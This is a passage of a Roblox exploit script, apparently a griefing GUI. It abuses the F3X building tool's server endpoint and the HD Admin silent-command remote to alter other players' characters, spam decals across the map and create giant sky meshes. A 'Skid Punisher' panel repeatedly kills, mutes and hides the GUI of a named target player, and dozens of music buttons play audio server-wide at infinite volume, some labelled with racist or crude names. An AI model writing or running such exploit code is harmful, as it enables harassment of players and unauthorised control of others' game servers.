            fastInvoke({"SyncAnchor", {{Part = p, Anchored = true}}})
            fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
            fastInvoke({"SetLocked", {p}, false})
            fastInvoke({"SetName", {{p}}, "Thomas"})
            fastInvoke({"CreateWelds", {p, hrp}, p})
            fastInvoke({"CreateLights", {{Part = p, LightType = "SpotLight"}}})
            fastInvoke({"SyncLighting", {{Part = p, LightType = "SpotLight", Brightness = 100}}})

            task.delay(0.05, function()    
                fastInvoke({"SyncAnchor", {{Part = p, Anchored = false}}})    
            end)
        end
    )

    -- Reset speed to normal
    local hum = targetChar:FindFirstChildOfClass("Humanoid")
    if hum then hum.WalkSpeed = 16 end

    -- Disable collisions for all parts
    RunService.RenderStepped:Connect(function()
        for _, v in ipairs(targetChar:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end)
end

-- MASS THOMAS TRANSFORMATION (Skip LocalPlayer)
for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= player then
        local targetChar = plr.Character
        if targetChar then
            setInvisibility(targetChar)
            buildThomas(targetChar)
        end
    end
end

-- OPTIONAL: Listen for new players joining
Players.PlayerAdded:Connect(function(plr)
    if plr ~= player then
        plr.CharacterAdded:Connect(function(char)
            setInvisibility(char)
            buildThomas(char)
        end)
    end
end)
    end
})
AddButton({
    Name = "Sky 3",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(5, 5, 5))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("137425341892469")
    end
})
AddButton({
    Name = "Decal 3",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("137425341892469")
    end
})
AddButton({
    Name = "Smaller sky",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(5, 5, 5))
            MeshResize(v, Vector3.new(8500, 8500, 8500))
        end
    end
end

-- Usage
Sky("137425341892469")
    end
})
AddButton({
    Name = "Skid Punisher",
    Callback = function()
        --// Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer

--// Silent Request
local SilentRequest = ReplicatedStorage
    :WaitForChild("HDAdminHDClient")
    .Signals
    .RequestCommandSilent

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "HDPunisherGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService("CoreGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 260, 0, 150)
Frame.Position = UDim2.new(0.35, 0, 0.3, 0)
Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35) -- dark grey
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "Skid Punisher 1.1"
Title.TextColor3 = Color3.fromRGB(220, 220, 220)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.Parent = Frame

--// Username Box
local UserBox = Instance.new("TextBox")
UserBox.Size = UDim2.new(0.9, 0, 0, 35)
UserBox.Position = UDim2.new(0.05, 0, 0.3, 0)
UserBox.PlaceholderText = "Target username"
UserBox.Text = ""
UserBox.ClearTextOnFocus = false
UserBox.TextColor3 = Color3.fromRGB(255, 255, 255)
UserBox.BackgroundColor3 = Color3.fromRGB(55, 55, 55) -- dark grey input
UserBox.Font = Enum.Font.Gotham
UserBox.TextSize = 14
UserBox.Parent = Frame
Instance.new("UICorner", UserBox).CornerRadius = UDim.new(0, 8)

--// Punish Button
local PunishButton = Instance.new("TextButton")
PunishButton.Size = UDim2.new(0.9, 0, 0, 35)
PunishButton.Position = UDim2.new(0.05, 0, 0.6, 0)
PunishButton.Text = "START PUNISH"
PunishButton.TextColor3 = Color3.fromRGB(255, 255, 255)
PunishButton.Font = Enum.Font.GothamBold
PunishButton.TextSize = 14
PunishButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70) -- dark grey button
PunishButton.Parent = Frame
Instance.new("UICorner", PunishButton).CornerRadius = UDim.new(0, 8)

--// Punish Logic
local Punishing = false

local function send(cmd)
    pcall(function()
        SilentRequest:InvokeServer(cmd)
    end)
end

local function punishLoop(target)
    while Punishing do
        send(";loopkill " .. target)
        send(";hideguis " .. target)
        send(";mute " .. target)
        task.wait(2.7)
    end
end

PunishButton.MouseButton1Click:Connect(function()
    local target = UserBox.Text
    if target == "" then return end

    Punishing = not Punishing
    PunishButton.Text = Punishing and "Stop fucking him" or "Reck him!!"
    PunishButton.BackgroundColor3 = Punishing
        and Color3.fromRGB(90, 90, 90)
        or Color3.fromRGB(70, 70, 70)

    if Punishing then
        task.spawn(function()
            punishLoop(target)
        end)
    end
end)
    end
})






MusicAddButton({
    Name = "Trench Boy",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110861497122845")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Gangsta Paradise",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 131407305554232")
SilentRequest:InvokeServer(";pitch 0.11")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Robbery",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 116887362714207")
SilentRequest:InvokeServer(";pitch 0.167")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Gangsta style",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 136300748366142")
SilentRequest:InvokeServer(";pitch 0.11")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = " Racist Song",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 74480486373722")
SilentRequest:InvokeServer(";pitch 0.156")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "679",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 72420924397376")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Dicks in my butt",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 79135236836095")
SilentRequest:InvokeServer(";pitch 0.097")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Don't work Anymore",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73508691589033")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Dont work Anymore",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 112120080486264")
SilentRequest:InvokeServer(";pitch 0.150")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Revenge",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 113238741822041")
SilentRequest:InvokeServer(";pitch 0.142")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Xo Tour Life",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 75954440425231")
SilentRequest:InvokeServer(";pitch 0.142")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Changes",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 103315293083837")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Tay K",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 102237185155700")
SilentRequest:InvokeServer(";pitch 0.142")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Wii Shop Theme",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 109425200074024")
SilentRequest:InvokeServer(";pitch 0.154")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Twist Jump",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 122263136565419")
SilentRequest:InvokeServer(";pitch 0.210")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Spooky Remix",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110587373430189")
SilentRequest:InvokeServer(";pitch 0.124")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Electro sp00k",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 85481339656782")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Electro sp00k speed up",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 85481339656782")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Spooky Remix x2",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110587373430189")
SilentRequest:InvokeServer(";pitch 0.177")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Pressure",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 135886229129696")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Orange Soda",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 95669340281523")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "GTA 4 Music",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 80403544262483")
SilentRequest:InvokeServer(";pitch 0.25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Blood Pop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 133251269532695")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Ohio Loop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 100891040749418")
SilentRequest:InvokeServer(";pitch 0.25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Some Loop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 107482942350312")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Krab Better Off Alone",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 83197094750741")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "WifiSkeleton",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 80536187524910")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Space Jam",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 103650979497454")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "YEAH!",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73562744560566")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Sugar Crash",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 107020752830019")
SilentRequest:InvokeServer(";pitch 0.155")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Don't like",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 130585576222032")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Sad nga hours",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 77813514369746")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Look At me",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 96773565642731")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Genocide pt4",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 114227367423167")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Met Her",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 118252483474508")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Don't work Anymore",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 90226759717646")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "2014 Mario.exe",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 108426430685406")
SilentRequest:InvokeServer(";pitch 0.25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Lavender Town",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 85789014973504")
SilentRequest:InvokeServer(";pitch 0.12")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Ngas on paris",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 80217751036107")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Unit load",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110781715902838")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "This Feeling",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 70924607021920")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Bitch Wtf Nga",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 127665886963153")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Doesn't work",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 71713528574891")
SilentRequest:InvokeServer(";pitch 0.25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Phonk Loop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 5356466111")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "XXXTENTACION",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 86520746630397")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Juice Wrld",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 109914086168461")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Crunch Time",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 100253052171063")
SilentRequest:InvokeServer(";pitch 0.106")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Saw U At Party",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 134067130228571")
SilentRequest:InvokeServer(";pitch 0.133")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Spooky Skeleton",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 136247552074672")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Corrido",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 75114960938580")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Spongebob song",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
